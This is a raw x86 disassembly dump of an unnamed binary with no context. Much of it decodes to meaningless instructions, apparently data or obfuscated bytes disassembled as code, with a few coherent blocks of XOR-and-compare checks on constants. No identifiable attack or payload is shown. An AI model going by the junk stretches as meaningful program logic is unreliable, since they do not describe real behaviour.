  418ca4:	sti    
  418ca5:	mov    edx,DWORD PTR [edi-0x41]
  418ca8:	jb     0x418d08
  418caa:	out    0xc5,al
  418cac:	jl     0x418d10
  418cae:	bound  eax,QWORD PTR [ecx-0x46]
  418cb1:	loop   0x418c4d
  418cb3:	adc    cl,cl
  418cb5:	or     eax,0x95fba529
  418cba:	mov    dl,0x81
  418cbc:	sub    edi,ebx
  418cbe:	pop    edi
  418cbf:	cmp    DWORD PTR [edx+0x7899266e],ebp
  418cc5:	outs   dx,BYTE PTR ds:[esi]
  418cc6:	xchg   edx,eax
  418cc7:	adc    eax,0xd1f9424e
  418ccc:	jmp    0x4187a775
  418cd1:	lds    esp,FWORD PTR [eax+0x13]
  418cd4:	jbe    0x418d33
  418cd6:	xor    eax,0x71c120ee
  418cdb:	setae  BYTE PTR [ebx+0x437b8b11]
  418ce2:	adc    eax,0x21d6a09f
  418ce7:	pop    edx
  418ce8:	cmp    BYTE PTR [ebx],ah
  418cea:	jmp    0xb032:0x1205816b
  418cf1:	(bad)  
  418cf2:	xor    ecx,DWORD PTR [eax+edi*8+0x7562a386]
  418cf9:	adc    BYTE PTR [esi],bl
  418cfb:	test   BYTE PTR [ecx],bl
  418cfd:	inc    ebx
  418cfe:	or     al,0x23
  418d00:	push   ecx
  418d01:	fcomp  QWORD PTR [eax-0x769aa7d5]
  418d07:	sub    al,0x9e
  418d09:	mov    dh,0x7c
  418d0b:	sahf   
  418d0c:	dec    esp
  418d0d:	clc    
  418d0e:	pop    eax
  418d0f:	push   edx
  418d10:	aas    
  418d11:	imul   edx,DWORD PTR [esi+0x51],0xa6b39fc8
  418d18:	xor    edx,ecx
  418d1a:	loopne 0x418ca2
  418d1c:	or     DWORD PTR [ecx+0x3e],eax
  418d1f:	pmaxsw mm2,QWORD PTR [ebp*4+0x1e0782b3]
  418d27:	sub    dl,BYTE PTR [ecx+0x69dca62b]
  418d2d:	mov    dh,0xf2
  418d2f:	in     al,dx
  418d30:	xchg   edx,eax
  418d31:	cmc    
  418d32:	pushf  
  418d33:	cdq    
  418d34:	adc    DWORD PTR [edx+0x7c],ebp
  418d37:	push   ss
  418d38:	iret   
  418d39:	push   cs
  418d3a:	stc    
  418d3b:	pushf  
  418d3c:	nop
  418d3d:	(bad)  
  418d3e:	(bad)  
  418d40:	mov    al,ds:0xb8ef5e4b
  418d45:	in     al,dx
  418d46:	lods   eax,DWORD PTR ds:[esi]
  418d47:	xchg   esp,eax
  418d48:	(bad)  
  418d49:	mov    ah,0xe9
  418d4b:	jp     0x418cf2
  418d4d:	and    dl,bh
  418d4f:	ins    BYTE PTR es:[edi],dx
  418d50:	lods   al,BYTE PTR ds:[esi]
  418d51:	dec    edi
  418d52:	jne    0x418d03
  418d54:	sbb    eax,DWORD PTR [esi]
  418d56:	cmp    bh,cl
  418d58:	inc    bp
  418d5a:	mov    bl,0xd4
  418d5c:	arpl   WORD PTR [edx+0x725558f7],ax
  418d62:	iret   
  418d63:	add    al,0xab
  418d65:	mov    cl,al
  418d67:	lds    esi,FWORD PTR [edx-0x3b]
  418d6a:	in     eax,dx
  418d6b:	mov    ch,0xd8
  418d6d:	(bad)  
  418d6e:	lahf   
  418d6f:	or     esp,DWORD PTR [esi+0x53e336f9]
  418d75:	push   ecx
  418d76:	push   edx
  418d77:	push   eax
  418d78:	call   0x422283
  418d7d:	mov    ecx,DWORD PTR [esp+0x50]
  418d81:	mov    ebx,DWORD PTR [esp+0x54]
  418d85:	add    eax,ecx
  418d87:	mov    ecx,DWORD PTR [esp+0x88]
  418d8e:	adc    edx,ebx
  418d90:	jmp    0x418fed
  418d95:	jmp    0x6c98:0xba87068d
  418d9c:	mov    bl,0x37
  418d9e:	cmc    
  418d9f:	mov    esp,0xa689faa4
  418da4:	jecxz  0x418dea
  418da6:	sti    
  418da7:	sar    BYTE PTR [esi-0x41413dcb],0x66
  418dae:	enter  0x926c,0x3c
  418db2:	sbb    dl,BYTE PTR [edi+0x1ed2a6bf]
  418db8:	mov    eax,0xbb8c37e8
  418dbd:	sub    eax,0x4f7925a6
  418dc2:	xor    BYTE PTR [ebp+0x73c2e247],ch
  418dc8:	ret    
  418dc9:	leave  
  418dca:	mov    ecx,0x147d3c22
  418dcf:	scas   al,BYTE PTR es:[edi]
  418dd0:	int    0xee
  418dd2:	push   edx
  418dd3:	cmp    ch,bl
  418dd5:	ret    
  418dd6:	inc    ecx
  418dd7:	sub    DWORD PTR [edi-0x39],esi
  418dda:	(bad)  
  418ddb:	cmp    al,0xa0
  418ddd:	dec    edx
  418dde:	push   0x5e
  418de0:	aad    0x8c
  418de2:	xchg   edx,eax
  418de3:	lds    ecx,FWORD PTR [ebx]
  418de5:	hlt    
  418de6:	aaa    
  418de7:	adc    BYTE PTR [ecx+0x25edad69],bl
  418ded:	mov    WORD PTR [edi+0xe23aa0a],fs
  418df3:	daa    
  418df4:	in     eax,0x54
  418df6:	shl    DWORD PTR [eax+0x3cb821aa],cl
  418dfc:	adc    ebx,ebp
  418dfe:	sbb    cl,BYTE PTR [edx]
  418e00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e01:	and    eax,0x457894fd
  418e06:	xchg   DWORD PTR [esi+0x26],ebp
  418e09:	mov    ah,0x1f
  418e0b:	xchg   edi,eax
  418e0c:	std    
  418e0d:	adc    ebx,edx
  418e0f:	nop
  418e10:	les    ebp,FWORD PTR [esi+0xa]
  418e13:	lods   al,BYTE PTR ds:[esi]
  418e14:	sub    BYTE PTR [esi-0x26cb6b1d],al
  418e1a:	cld    
  418e1b:	mov    edx,0x3d1c599
  418e20:	sti    
  418e21:	out    0xbe,eax
  418e23:	iret   
  418e24:	je     0x418e47
  418e26:	fs pop esi
  418e28:	bswap  esi
  418e2a:	pop    ebx
  418e2b:	xor    edi,DWORD PTR [ebp+0x3b3cc272]
  418e31:	leave  
  418e32:	retf   0x7b8a
  418e35:	out    0x5f,al
  418e37:	out    dx,eax
  418e38:	jle    0x418dc9
  418e3a:	out    dx,al
  418e3b:	fisttp DWORD PTR [edx-0xf0c42ce]
  418e41:	inc    DWORD PTR [ecx-0x6a]
  418e44:	fcomp  QWORD PTR [eax-0x69768f25]
  418e4a:	mov    ecx,0x45b873c8
  418e4f:	iret   
  418e50:	mov    cl,0x6a
  418e52:	bound  edx,QWORD PTR [edi-0x69b9de27]
  418e58:	(bad)  [ecx-0x58]
  418e5b:	cld    
  418e5c:	push   ebp
  418e5d:	ret    
  418e5e:	lods   eax,DWORD PTR ds:[esi]
  418e5f:	add    DWORD PTR [edi-0x31e6bb59],ecx
  418e65:	jb     0x418e7a
  418e67:	stc    
  418e68:	fld    DWORD PTR [eax+0x24]
  418e6b:	inc    edi
  418e6c:	loopne 0x418e77
  418e6e:	and    BYTE PTR [edi],dl
  418e70:	test   dl,dl
  418e72:	dec    ebx
  418e73:	xor    BYTE PTR [esi+edi*8+0x4e],bl
  418e77:	mov    ecx,DWORD PTR [eax-0x31]
  418e7a:	popa   
  418e7b:	mov    ds:0xe431cf18,eax
  418e80:	jp     0x418e51
  418e82:	in     al,dx
  418e83:	push   ecx
  418e84:	lods   al,BYTE PTR ds:[esi]
  418e85:	jo     0x418e44
  418e87:	fld    TBYTE PTR [eax+esi*8+0x1e]
  418e8b:	jbe    0x418eea
  418e8d:	into   
  418e8e:	pushf  
  418e8f:	dec    ebx
  418e90:	xchg   ecx,eax
  418e91:	inc    esp
  418e92:	idiv   DWORD PTR [ebp+0x68]
  418e95:	mov    edi,0xd161d648
  418e9a:	fs mov eax,0xe431b1a2
  418ea0:	adc    edi,DWORD PTR [edx]
  418ea2:	retf   
  418ea3:	mov    ch,0x48
  418ea5:	jo     0x418e61
  418ea7:	fist   WORD PTR [eax]
  418ea9:	fdivr  QWORD PTR [esi]
  418eab:	mov    ch,BYTE PTR [ebx+0x39]
  418eae:	ins    BYTE PTR es:[edi],dx
  418eaf:	jmp    0x418e50
  418eb1:	clc    
  418eb2:	xchg   edi,eax
  418eb3:	mov    al,0xd9
  418eb5:	jns    0x418e5b
  418eb7:	pop    ecx
  418eb8:	in     eax,dx
  418eb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418eba:	mov    BYTE PTR [eax+0x3a1490bc],ch
  418ec0:	push   esi
  418ec1:	(bad)  
  418ec2:	addr16 ret 
  418ec4:	into   
  418ec5:	dec    cl
  418ec7:	mov    eax,DWORD PTR [edx]
  418ec9:	cmc    
  418eca:	pop    eax
  418ecb:	pushf  
  418ecc:	fistp  QWORD PTR [ecx]
  418ece:	stos   BYTE PTR es:[edi],al
  418ecf:	cmp    BYTE PTR [eax-0x4e],dh
  418ed2:	jbe    0x418ef1
  418ed4:	ss jg  0x418f0d
  418ed7:	into   
  418ed8:	pop    ebx
  418ed9:	repz je 0x418f31
  418edc:	dec    eax
  418edd:	xchg   esp,eax
  418ede:	xor    eax,0xff2683eb
  418ee3:	pop    ss
  418ee4:	es test al,0xad
  418ee7:	jecxz  0x418e6d
  418ee9:	mov    dh,0x22
  418eeb:	jne    0x418f52
  418eed:	push   edx
  418eee:	jle    0x418e70
  418ef0:	data16 ja 0x418e94
  418ef3:	dec    edi
  418ef4:	jg     0xc9d1a887
  418efa:	or     dh,BYTE PTR [ecx-0x1116ff28]
  418f00:	les    esp,FWORD PTR [edx+0x43596266]
  418f06:	popf   
  418f07:	or     eax,0x5bec430
  418f0c:	test   BYTE PTR [eax+eax*8],0x6e
  418f10:	or     DWORD PTR [ebp-0x7df85706],esp
  418f16:	nop
  418f17:	mov    DWORD PTR [edx-0x23faed2],eax
  418f1d:	sbb    al,cl
  418f1f:	cmp    esp,0x5f
  418f22:	js     0x418f44
  418f24:	mov    bh,0x89
  418f26:	les    ecx,FWORD PTR [eax-0x51e01d20]
  418f2c:	xchg   edx,eax
  418f2d:	ds jae 0x418f54
  418f30:	dec    eax
  418f31:	pop    ss
  418f32:	shl    DWORD PTR [esi-0x3f],cl
  418f35:	inc    esp
  418f36:	pop    es
  418f37:	jo     0x418f51
  418f39:	mov    al,0xfd
  418f3b:	(bad)  
  418f3d:	mov    edi,0x30d61595
  418f42:	aam    0x55
  418f44:	das    
  418f45:	sub    BYTE PTR ss:[ebp+0x8],dl
  418f49:	jo     0x418edb
  418f4b:	adc    dh,BYTE PTR [eax]
  418f4d:	jp     0x418f94
  418f4f:	shl    BYTE PTR [eax+eax*1-0x5b],1
  418f53:	pop    ecx
  418f54:	mov    ds:0x41dbffa3,al
  418f59:	cmp    DWORD PTR [ebp+0x446078fa],edi
  418f5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f60:	push   ds
  418f61:	xlat   BYTE PTR ds:[ebx]
  418f62:	and    eax,0x40085e99
  418f67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f68:	out    dx,al
  418f69:	push   edi
  418f6a:	xchg   esi,esp
  418f6c:	adc    al,0x34
  418f6e:	push   ebp
  418f6f:	fisubr DWORD PTR [ebx+0x2d]
  418f72:	rol    esi,cl
  418f74:	sbb    al,0x8
  418f76:	or     eax,0x8dfaf43a
  418f7b:	dec    edx
  418f7c:	fucomp st(2)
  418f7e:	fnstenv ds:0xc6ea8654
  418f84:	inc    eax
  418f85:	int    0xfd
  418f87:	adc    al,0x4c
  418f89:	xchg   edi,eax
  418f8a:	ss pop es
  418f8c:	or     dl,BYTE PTR [ebx-0x3278bca3]
  418f92:	inc    esi
  418f93:	arpl   WORD PTR [edx+0x488c8783],sp
  418f99:	cmc    
  418f9a:	push   esi
  418f9b:	dec    edx
  418f9c:	jg     0x418fb1
  418f9e:	test   esp,ebp
  418fa0:	ss adc al,0xfd
  418fa3:	mov    ah,0x5e
  418fa5:	xchg   ebp,eax
  418fa6:	and    ch,BYTE PTR [ebx]
  418fa8:	lahf   
  418fa9:	cmp    al,0x7b
  418fab:	sbb    al,0x41
  418fad:	sbb    ebx,DWORD PTR [eax+ebx*2-0x52]
  418fb1:	inc    esi
  418fb2:	hlt    
  418fb3:	ret    
  418fb4:	shl    DWORD PTR [edx-0x14],cl
  418fb7:	xchg   DWORD PTR [ebx+esi*2+0x272a15a0],esi
  418fbe:	inc    ecx
  418fbf:	pop    esi
  418fc0:	pop    ebp
  418fc1:	mov    WORD PTR [ebx],gs
  418fc3:	xchg   edx,eax
  418fc4:	dec    ebx
  418fc5:	xchg   esp,edi
  418fc7:	test   al,0x31
  418fc9:	(bad)  
  418fca:	int    0xc4
  418fcc:	pop    ebp
  418fcd:	inc    ecx
  418fce:	sub    al,0x54
  418fd0:	lea    eax,[ecx-0x5a6eac59]
  418fd6:	popa   
  418fd7:	xchg   ebp,eax
  418fd8:	jnp    0x418ff9
  418fda:	push   0x1c311929
  418fdf:	js     0x418fa7
  418fe1:	or     al,0xb3
  418fe3:	mov    cl,ch
  418fe5:	mov    DWORD PTR [edi],ecx
  418fe7:	shl    BYTE PTR [esi],0xdf
  418fea:	(bad)  
  418feb:	xchg   edx,eax
  418fec:	mov    ebx,DWORD PTR cs:[esp+0x8c]
  418ff4:	cmp    ecx,eax
  418ff6:	jne    0x419004
  418ffc:	cmp    ebx,edx
  418ffe:	je     0x41a937
  419004:	mov    eax,DWORD PTR [esp+0x40]
  419008:	mov    edx,DWORD PTR [esp+0x18]
  41900c:	xor    ecx,ecx
  41900e:	shld   ecx,eax,0x2
  419012:	jmp    0x41926f
  419017:	retf   0xad14
  41901a:	repnz mov eax,0x983c8a74
  419020:	xchg   edx,eax
  419021:	xor    bl,ch
  419023:	imul   ecx,ebp,0x5c
  419026:	sar    DWORD PTR [edi+edi*8-0x3dca4140],1
  41902d:	mov    esi,0x2d3a9ebe
  419032:	fnstenv [ecx-0x8]
  419035:	test   al,0x7a
  419037:	sbb    edx,ebp
  419039:	or     al,0x93
  41903b:	fcom   QWORD PTR [esi]
  41903d:	rcr    BYTE PTR [edi+0x3],0x8e
  419041:	(bad)  
  419042:	out    dx,eax
  419043:	sar    DWORD PTR ds:0x83b6b68d,0xee
  41904a:	bound  esi,QWORD PTR [eax+eax*8-0x59fea0e9]
  419051:	stc    
  419052:	ret    
  419053:	sti    
  419054:	push   esp
  419056:	or     esp,DWORD PTR [esi+edx*8-0x601ad14d]
  41905d:	jp     0x4190bf
  41905f:	lods   al,BYTE PTR ds:[esi]
  419060:	scas   eax,DWORD PTR es:[edi]
  419061:	xchg   esp,eax
  419062:	mov    esp,0x9951f2f0
  419067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419068:	in     eax,0xdf
  41906a:	jge    0x419068
  41906c:	push   ss
  41906d:	adc    BYTE PTR [ecx],cl
  41906f:	and    ebp,DWORD PTR [eax-0x2]
  419072:	arpl   WORD PTR [eax],sp
  419074:	ja     0x4190a7
  419076:	loope  0x4190d4
  419078:	sbb    al,0x88
  41907a:	fadd   QWORD PTR [edi]
  41907c:	xchg   edi,eax
  41907d:	in     eax,dx
  41907e:	cmp    al,0x8f
  419080:	icebp  
  419081:	pop    esi
  419082:	jmp    0x518d4bf2
  419087:	sub    al,BYTE PTR [ebp+0xd]
  41908a:	cld    
  41908b:	push   edx
  41908c:	inc    esp
  41908d:	mov    al,ds:0xc5460e8d
  419092:	push   ecx
  419093:	mov    dh,BYTE PTR [eax-0x3a]
  419096:	sub    eax,0x2f32dc36
  41909b:	dec    esi
  41909c:	pop    esp
  41909d:	sbb    al,0x54
  41909f:	mov    dh,0xa0
  4190a1:	jp     0x419094
  4190a3:	repz push 0xd22b0681
  4190a9:	push   cs
  4190aa:	xchg   edx,eax
  4190ab:	cmc    
  4190ac:	dec    ebp
  4190ad:	js     0x4190c6
  4190af:	iret   
  4190b0:	jg     0x4190f5
  4190b2:	xchg   ecx,eax
  4190b3:	xchg   ecx,eax
  4190b4:	sbb    eax,0xac29b6d1
  4190b9:	ins    DWORD PTR es:[edi],dx
  4190ba:	xchg   ecx,eax
  4190bb:	imul   esp,DWORD PTR [edi+0x58],0xffffffe3
  4190bf:	mov    ebx,DWORD PTR [edi+0x5307ef00]
  4190c5:	out    0x9b,eax
  4190c7:	xor    eax,0x187dacda
  4190cc:	dec    edi
  4190cd:	dec    esp
  4190ce:	and    edx,esi
  4190d0:	jbe    0x419124
  4190d2:	repnz add al,0x88
  4190d5:	cli    
  4190d6:	fild   DWORD PTR [ebp+edi*1-0x2c8d9a2e]
  4190dd:	dec    esp
  4190de:	mov    ebp,0x7ace11eb
  4190e3:	xlat   BYTE PTR ds:[ebx]
  4190e4:	sbb    eax,0xb2e3f551
  4190e9:	xchg   ecx,eax
  4190ea:	push   0xcaab8ded
  4190ef:	pop    esi
  4190f0:	aas    
  4190f1:	out    0x4b,al
  4190f3:	dec    esi
  4190f4:	rcr    BYTE PTR [ebx-0x76],0x87
  4190f8:	xor    eax,0x9dbbf2f6
  4190fd:	jmp    0x85be46a6
  419102:	fmul   DWORD PTR es:[edx]
  419105:	jg     0x419094
  419107:	fmul   st(6),st
  419109:	jecxz  0x419117
  41910b:	inc    edx
  41910c:	jo     0x419150
  41910e:	mov    dl,0x6e
  419110:	outs   dx,BYTE PTR ds:[esi]
  419111:	jl     0x419103
  419113:	sub    dl,ch
  419115:	mov    ch,0x6f
  419117:	dec    edi
  419118:	aas    
  419119:	push   edi
  41911a:	js     0x41909e
  41911c:	jno    0x4190bb
  41911e:	adc    bh,cl
  419120:	dec    ebx
  419121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419122:	ja     0x419116
  419124:	mov    ah,0xb2
  419126:	ins    DWORD PTR es:[edi],dx
  419127:	push   0x8a2d7a79
  41912c:	out    dx,al
  41912d:	stc    
  41912e:	fcomp  DWORD PTR [edx+0x1a]
  419131:	lahf   
  419132:	cmc    
  419133:	or     eax,0x17f140d0
  419138:	xor    cl,BYTE PTR [ecx]
  41913a:	add    edx,DWORD PTR [esi]
  41913c:	mov    bh,0x53
  41913e:	push   ebx
  41913f:	xchg   esp,eax
  419140:	or     ebx,DWORD PTR [esi+0x14]
  419143:	sbb    eax,0xd2119a48
  419148:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419149:	leave  
  41914a:	cld    
  41914b:	add    eax,0xbc475b8f
  419150:	mov    bh,0xbd
  419152:	out    0x4f,eax
  419154:	daa    
  419155:	lock or al,0xf5
  419158:	add    BYTE PTR [esi],dl
  41915a:	push   cs
  41915b:	cmp    BYTE PTR [eax-0x1af45f29],al
  419161:	xlat   BYTE PTR ds:[ebx]
  419162:	ret    0x1edc
  419165:	(bad)  
  419166:	mov    eax,ds:0x21f67392
  41916b:	sub    al,0x81
  41916d:	imul   edi,DWORD PTR [edi],0xe5e08c18
  419173:	cmp    dh,BYTE PTR [edx+ebp*8+0x76]
  419177:	mov    edi,0x5a62bbc2
  41917c:	mov    bh,0x31
  41917e:	frstor [esi-0x6c]
  419181:	push   esp
  419182:	out    dx,eax
  419183:	cwde   
  419184:	hlt    
  419185:	adc    ah,BYTE PTR [edi-0x25d36db3]
  41918b:	leave  
  41918c:	adc    BYTE PTR [edi+0x58],bl
  41918f:	sub    BYTE PTR [esi-0x6382e279],cl
  419195:	or     bh,al
  419197:	out    0x1e,eax
  419199:	dec    ebp
  41919a:	push   ecx
  41919b:	sub    eax,0x8353209c
  4191a0:	inc    ebp
  4191a1:	retf   
  4191a2:	outs   dx,BYTE PTR ds:[esi]
  4191a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191a5:	loop   0x41919c
  4191a7:	cmp    ebx,ecx
  4191a9:	pop    edx
  4191aa:	sub    DWORD PTR [esi+ecx*8-0x24007296],edi
  4191b1:	stc    
  4191b2:	loopne 0x41916a
  4191b4:	jno    0x419158
  4191b6:	pusha  
  4191b7:	out    0xb2,eax
  4191b9:	cdq    
  4191ba:	cmp    ah,BYTE PTR [ebx-0x9]
  4191bd:	arpl   WORD PTR [esi],cx
  4191bf:	push   es
  4191c0:	and    BYTE PTR [ebp-0x1f],0x51
  4191c4:	jp     0x4191a8
  4191c6:	aam    0x84
  4191c8:	stos   BYTE PTR es:[edi],al
  4191c9:	mov    bl,0xb
  4191cb:	mov    ebx,ebp
  4191cd:	sub    ebp,ebx
  4191cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191d0:	push   eax
  4191d1:	clc    
  4191d2:	leave  
  4191d3:	mov    ds:0x32886c6e,al
  4191d8:	dec    eax
  4191d9:	jne    0x419256
  4191db:	stc    
  4191dc:	add    esi,DWORD PTR [esi]
  4191de:	test   eax,0xfecf6fa9
  4191e3:	dec    ecx
  4191e4:	mov    al,ds:0x459a56c2
  4191e9:	push   ds
  4191ea:	imul   eax,esp,0xaf20299d
  4191f0:	or     eax,DWORD PTR [esi+0xf]
  4191f3:	xlat   BYTE PTR ss:[ebx]
  4191f5:	push   ecx
  4191f6:	push   esi
  4191f7:	and    DWORD PTR [esi-0x75536a5],0xaec15804
  419201:	loope  0x4191c3
  419203:	ins    BYTE PTR es:[edi],dx
  419204:	popf   
  419205:	cli    
  419206:	push   edx
  419207:	lds    esp,FWORD PTR [esi]
  419209:	sbb    DWORD PTR [ebp+edi*2-0x5c315421],edi
  419210:	push   ebp
  419211:	lock nop
  419213:	fist   WORD PTR [ecx*2+0xffd80]
  41921a:	cli    
  41921b:	or     al,0x1a
  41921d:	mov    eax,ds:0xd97c27c8
  419222:	sub    eax,eax
  419224:	mov    WORD PTR [eax-0x1aca9686],gs
  41922a:	fs out dx,al
  41922c:	or     al,0xaa
  41922e:	jb     0x4191f8
  419230:	cli    
  419231:	or     al,0xa
  419233:	or     BYTE PTR [edx-0x5f],dl
  419236:	addr16 mov dl,0xb5
  419239:	enter  0xe33c,0x3c
  41923d:	xchg   edx,eax
  41923e:	retf   0xc1af
  419241:	loop   0x41928f
  419243:	or     DWORD PTR [eax],esp
  419245:	or     al,0x76
  419247:	adc    eax,0xf8b6ebad
  41924c:	aam    0x36
  41924e:	cmp    eax,0x4b4cbb32
  419253:	mov    eax,0x32b69a62
  419258:	add    ebp,DWORD PTR [ebx]
  41925a:	mov    cl,0xdd
  41925c:	scas   al,BYTE PTR es:[edi]
  41925d:	stos   DWORD PTR es:[edi],eax
  41925e:	loop   0x4192a8
  419260:	jmp    0x16e3:0x835c5135
  419267:	gs es pop ss
  41926a:	cmp    al,0xb
  41926c:	popa   
  41926d:	and    eax,0x2e0c167
  419272:	mov    ebx,0xcb79b576
  419277:	mov    DWORD PTR [esp+0x10],edx
  41927b:	mov    edx,DWORD PTR [esp+0x1c]
  41927f:	xor    eax,ebx
  419281:	xor    ecx,esi
  419283:	mov    DWORD PTR [esp+0x14],edx
  419287:	cmp    eax,DWORD PTR [esp+0x10]
  41928b:	jne    0x419299
  419291:	cmp    ecx,edx
  419293:	je     0x41a93c
  419299:	mov    eax,DWORD PTR [esp+0x44]
  41929d:	cmp    eax,0xa5069baa
  4192a2:	je     0x4192f6
  4192a8:	mov    edx,DWORD PTR [esp+0x18]
  4192ac:	mov    eax,DWORD PTR [esp+0x1c]
  4192b0:	xor    eax,esi
  4192b2:	xor    edx,0xcb79b577
  4192b8:	shrd   edx,eax,0x2
  4192bc:	shr    eax,0x2
  4192bf:	mov    DWORD PTR [esp+0x34],eax
  4192c3:	mov    eax,DWORD PTR [esp+0x18]
  4192c7:	mov    ecx,DWORD PTR [esp+0x1c]
  4192cb:	shl    eax,0x1e
  4192ce:	xor    eax,0x80000000
  4192d3:	or     eax,DWORD PTR [esp+0x34]
  4192d7:	xor    ecx,ecx
  4192d9:	mov    DWORD PTR [esp+0x14],eax
  4192dd:	mov    eax,DWORD PTR [esp+0x60]
  4192e1:	or     ecx,edx
  4192e3:	cdq    
  4192e4:	cmp    ecx,eax
  4192e6:	jne    0x41a93c
  4192ec:	cmp    DWORD PTR [esp+0x14],edx
  4192f0:	jne    0x41a93c
  4192f6:	mov    DWORD PTR [esp+0x5c],0x4227a4
  4192fe:	mov    DWORD PTR [esp+0x68],0x42279c
  419306:	mov    eax,DWORD PTR [esp+0x78]
  41930a:	mov    eax,DWORD PTR [esp+0x78]
  41930e:	mov    edx,DWORD PTR [esp+0x18]
  419312:	xor    ecx,ecx
  419314:	shld   ecx,eax,0x2
  419318:	shl    eax,0x2
  41931b:	mov    DWORD PTR [esp+0x10],edx
  41931f:	mov    edx,DWORD PTR [esp+0x1c]
  419323:	xor    eax,ebx
  419325:	xor    ecx,esi
  419327:	mov    DWORD PTR [esp+0x14],edx
  41932b:	cmp    DWORD PTR [esp+0x10],eax
  41932f:	jne    0x41a5e3
  419335:	cmp    edx,ecx
  419337:	jne    0x41a5e3
  41933d:	mov    DWORD PTR [esp+0x30],0x42272c
  419345:	mov    eax,DWORD PTR [esp+0x18]
  419349:	mov    ecx,DWORD PTR [esp+0x1c]
  41934d:	shrd   eax,ecx,0x2
  419351:	shr    ecx,0x2
  419354:	mov    ecx,DWORD PTR [esp+0x18]
  419358:	mov    edx,DWORD PTR [esp+0x1c]
  41935c:	mov    edx,DWORD PTR [esp+0x30]
  419360:	mov    edx,DWORD PTR [edx+0xc]
  419363:	mov    DWORD PTR [esp+0xc],eax
  419367:	shl    ecx,0x1e
  41936a:	mov    eax,0x32de6d5d
  41936f:	xor    DWORD PTR [esp+0xc],eax
  419373:	xor    ecx,ecx
  419375:	or     ecx,DWORD PTR [esp+0xc]
  419379:	cmp    ecx,DWORD PTR [edx]
  41937b:	jne    0x41a320
  419381:	mov    ecx,0x65c7
  419386:	mov    WORD PTR [esp+0x2c],cx
  41938b:	mov    ecx,0x6062
  419390:	mov    WORD PTR [esp+0x24],cx
  419395:	mov    ecx,0x125d
  41939a:	mov    WORD PTR [esp+0xc],cx
  41939f:	movzx  ecx,WORD PTR [esp+0xc]
  4193a4:	mov    edx,0x2d0f
  4193a9:	and    cx,dx
  4193ac:	mov    dx,WORD PTR [esp+0x24]
  4193b1:	or     cx,dx
  4193b4:	mov    dx,WORD PTR [esp+0x2c]
  4193b9:	add    cx,dx
  4193bc:	or     ecx,0x3b22
  4193c2:	mov    WORD PTR [esp+0x3c],cx
  4193c7:	mov    ecx,0x57d4
  4193cc:	mov    WORD PTR [esp+0x2c],cx
  4193d1:	mov    ecx,0x3b21
  4193d6:	mov    WORD PTR [esp+0x38],cx
  4193db:	mov    ecx,0x52fd
  4193e0:	mov    WORD PTR [esp+0x24],cx
  4193e5:	mov    ecx,0x2ce0
  4193ea:	mov    WORD PTR [esp+0xc],cx
  4193ef:	mov    cx,WORD PTR [esp+0xc]
  4193f4:	mov    dx,WORD PTR [esp+0x24]
  4193f9:	jmp    0x419656
  4193fe:	gs pop ss
  419400:	dec    BYTE PTR [eax+esi*4]
  419403:	sbb    al,0x6b
  419405:	mov    esp,0xd16889ea
  41940a:	pop    ss
  41940b:	adc    al,0x9a
  41940d:	jecxz  0x419442
  41940f:	add    eax,0xc235bec0
  419414:	mov    esi,0x3623edbe
  419419:	xchg   edx,eax
  41941a:	mov    ds:0xaa76cf49,al
  41941f:	ins    BYTE PTR es:[edi],dx
  419420:	int    0xd9
  419422:	jecxz  0x4193fa
  419424:	sub    BYTE PTR [esi-0x7a],ah
  419427:	jnp    0x41941e
  419429:	mov    dh,0x7f
  41942b:	push   cs
  41942c:	pop    ds
  41942d:	into   
  41942e:	out    dx,eax
  41942f:	fldenv [eax+esi*4+0x774f5822]
  419436:	mov    al,0xfa
  419438:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419439:	xor    al,0x15
  41943b:	or     eax,0x1647adc5
  419440:	in     eax,0xd3
  419442:	arpl   WORD PTR [esi],dx
  419444:	div    BYTE PTR [ecx-0x15]
  419447:	test   BYTE PTR [ecx],ah
  419449:	test   BYTE PTR ds:[ebx-0x7a],cl
  41944d:	cmc    
  41944e:	xlat   BYTE PTR ds:[ebx]
  41944f:	sbb    BYTE PTR [ebx],dh
  419451:	pop    edi
  419452:	stos   DWORD PTR es:[edi],eax
  419453:	shl    ah,cl
  419455:	jg     0x41941e
  419457:	das    
  419458:	pop    ecx
  419459:	std    
  41945a:	int    0x9
  41945c:	fist   WORD PTR [ecx]
  41945e:	cmp    ah,BYTE PTR [ebx]
  419460:	mov    ds,WORD PTR [ebp-0x15]
  419463:	rcr    BYTE PTR [edi+0x7d9579a],1
  419469:	or     edi,DWORD PTR [ebx]
  41946b:	js     0x41945c
  41946d:	lods   al,BYTE PTR ds:[esi]
  41946e:	pop    ecx
  41946f:	test   DWORD PTR [edi+0x76],edx
  419472:	mov    al,ds:0x8df579e9
  419477:	xor    BYTE PTR [edi-0x335be8b],dh
  41947d:	fwait
  41947e:	inc    edx
  41947f:	sbb    al,0x62
  419481:	pop    ds
  419482:	(bad)  
  419483:	jle    0x4194f9
  419485:	or     DWORD PTR [ebx+0x411403af],esp
  41948b:	hlt    
  41948c:	add    al,0x6f
  41948e:	cld    
  41948f:	pop    es
  419490:	fs aas 
  419492:	retf   0x496e
  419495:	bnd jo 0x41942f
  419498:	into   
  419499:	in     al,0x26
  41949b:	or     eax,0xec2cffb5
  4194a0:	dec    esi
  4194a1:	sub    al,0x27
  4194a3:	mov    WORD PTR [esi],fs
  4194a5:	mov    esi,0x90c958b9
  4194aa:	jge    0x4194fe
  4194ac:	out    0x3d,eax
  4194ae:	pop    ss
  4194af:	pop    esi
  4194b0:	xor    ah,0x24
  4194b3:	cdq    
  4194b4:	sbb    BYTE PTR [eax-0x10],0xb8
  4194b8:	mov    edx,0x786edde4
  4194bd:	add    eax,0xd204183
  4194c2:	stos   BYTE PTR es:[edi],al
  4194c3:	rcl    DWORD PTR [edx+0x73eadbca],cl
  4194c9:	and    BYTE PTR [eax+0x207645c1],dl
  4194cf:	mov    esp,0x4a94c074
